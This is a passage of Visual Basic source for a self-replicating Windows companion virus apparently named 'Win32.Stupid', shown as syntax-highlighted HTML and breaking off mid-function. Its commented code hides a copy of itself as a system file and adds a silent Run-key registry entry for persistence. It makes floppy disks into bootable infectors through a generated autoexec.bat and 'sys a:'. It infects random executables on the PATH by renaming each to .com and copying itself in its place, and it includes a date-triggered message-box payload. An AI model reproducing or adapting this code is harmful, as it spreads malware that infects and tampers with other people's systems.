</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">wein</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">nodat0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">  </span><span class="sc1">' then we make one and copy smile.exe
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">smile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Dat0copy</span><span class="sc0">                                </span><span class="sc1">' to c: also
</span><span class="sc7">nodat0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">smile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Smilecopy</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc7">Dat0copy</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbReadOnly</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbSystem</span><span class="sc0">  </span><span class="sc1">' set dat0.exe hidden and system
</span><span class="sc3">Else</span><span class="sc0">                                    </span><span class="sc1">' to help us hide
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">smile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Smilecopy</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">adone</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">' Here we find all drives attached to the machine
' we are looking only for removable (type 2), no root (type 1),
' remote (type 4) and fixed drives (type 3)
' NOT cd roms (type 5), unknown (type 0) or ram disk (type 6)
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Find_Drives</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">strBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lngBytes</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">intPos</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">intPos2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">strDrive</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">strBuffer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">lngBytes</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetLogicalDriveStrings</span><span class="sc6">(</span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">strBuffer</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">strBuffer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">intPos2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">intPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">intPos2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">strBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNullChar</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">intPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">intPos</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc7">lngBytes</span><span class="sc0">
</span><span class="sc7">xc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">xc</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">strDrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">strBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">intPos2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">intPos</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">intPos2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">xc</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">strDrive</span><span class="sc0">
</span><span class="sc7">intPos2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">intPos</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">intPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">intPos2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">strBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">' Simple way to enter our RUN service in the reg
' shell it out to regedit /s
' /s is "silent" so the user sees no msg box
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">makereg</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"c:\v.reg"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REGEDIT4"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"""Vic""=""\""c:\\dat0.exe\"""""</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc4">"regedit /s c:\v.reg"</span><span class="sc0">
</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc4">"c:\v.reg"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">' If we are copying to the a: drive and we find a disk in the a:
' then lets create a autoexec.bat and sys the drive so it's like
' a bootable infector.
' We get the windows start dir from the reg
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ADrive</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc0">   </span><span class="sc1">' as soon as we get an error get out - no need to make the a: flash more than necessary
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">Smilecopy</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Smile.exe"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">smile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Smilecopy</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"a:\autoexec.bat"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"@echo off"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"copy smile.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">supspn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\smile.exe"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cls"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"del autoexec.bat"</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"c:\s.bat"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"path=c:\windows\command"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"c:"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sys a:"</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc4">"c:\s.bat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHide</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">out</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">' If we found a companion then execute the file and quite our virus
' we get the name from our name (app.EXEName) and just execute the
' .com equivilant
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ExecuteFile</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">wearecom</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">vbNormalNoFocus</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">' Begin our "virus" code
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WeVirus</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">pathz</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">dispick</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">EXEFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc4">"c:\p.d"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"p.d"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">  </span><span class="sc1">' if our path file does not exist then
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"pth.bat"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">' we need to make it
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"path &gt; c:\p.d"</span><span class="sc0">       </span><span class="sc1">' c:\p.d is just the path command captured to   
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">' a text file so we can get some paths
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc4">"pth.bat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHide</span><span class="sc0">         </span><span class="sc1">' to infect
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">1000000</span><span class="sc0">        </span><span class="sc1">' delay so the computer catches up
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">              </span><span class="sc1">' then we can get our paths
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">ctr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"c:\p.d"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">Shared</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">' open our path file
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">EOF</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">snap</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">snapit</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"PATH="</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">snapit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc1">' remove the statement "PATH="
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">snap</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">";"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">snapit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">snapit</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">snap</span><span class="sc0">  </span><span class="sc1">' keep working till we get to ";"
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">snap</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">";"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">                  </span><span class="sc1">' if we get a ";" then put that
</span><span class="sc7">pathz</span><span class="sc6">(</span><span class="sc7">ctr</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">snapit</span><span class="sc0">                 </span><span class="sc1">' path into an array for use later
</span><span class="sc7">snapit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">ctr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ctr</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc0">

</span><span class="sc7">dispick</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">pathz</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ctr</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">       </span><span class="sc1">' pick a random path to infect (from our array)
</span><span class="sc7">pathtoinfect</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">spn</span><span class="sc6">(</span><span class="sc7">dispick</span><span class="sc6">)</span><span class="sc0">             </span><span class="sc1">' get the windows short path name for
</span><span class="sc0">
</span><span class="sc7">InfectEXEName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">pathtoinfect</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\*.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbDirectory</span><span class="sc6">)</span><span class="sc0">   </span><span class="sc1">' begin to find all *.exe files in that path
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">InfectEXEName</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">EXEFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EXEFile</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">EXEFile</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InfectEXEName</span><span class="sc0">
</span><span class="sc7">InfectEXEName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">

</span><span class="sc1">' once we have all our exe's we want to just pick one
' I just pick a random one
</span><span class="sc0">
</span><span class="sc7">pickedexe</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">infect</span><span class="sc6">((</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">EXEFile</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">rawEXEName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">pickedexe</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">pickedexe</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">  </span><span class="sc1">' remove the ".exe" from the file we want to infect
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">dispick</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">rawEXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".com"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">rawEXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".com"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">' see if a companion already exists
</span><span class="sc0">
</span><span class="sc1">' if no companion exists then copy the file as a .com
' and copy ourself into it's place (companion infection)
</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">pathtoinfect</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">pickedexe</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pathtoinfect</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">rawEXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".com"</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">smile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pathtoinfect</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">pickedexe</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">' The short path name function
' the makes everything easier to code because it converts
' stuff like c:\program files to c:\progra~1
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">spn</span><span class="sc6">(</span><span class="sc7">sp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">sb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">200</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">lb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetShortPathName</span><span class="sc6">(</span><span class="sc7">sp</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sb</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">lb</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">spn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">sb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lb</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">' See if we are going to run our msg box payload
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">PassCheck</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Minute</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"DAMN!!"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbCr</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"This is..."</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbCr</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"*S T U P I D*"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbExclamation</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Win32.Stupid"</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">well</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">MsgBox</span><span class="sc6">(</span><span class="sc4">"Cameron Diaz is a goddess!"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbExclamation</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbYesNo</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Vic says..."</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">well</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbYes</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
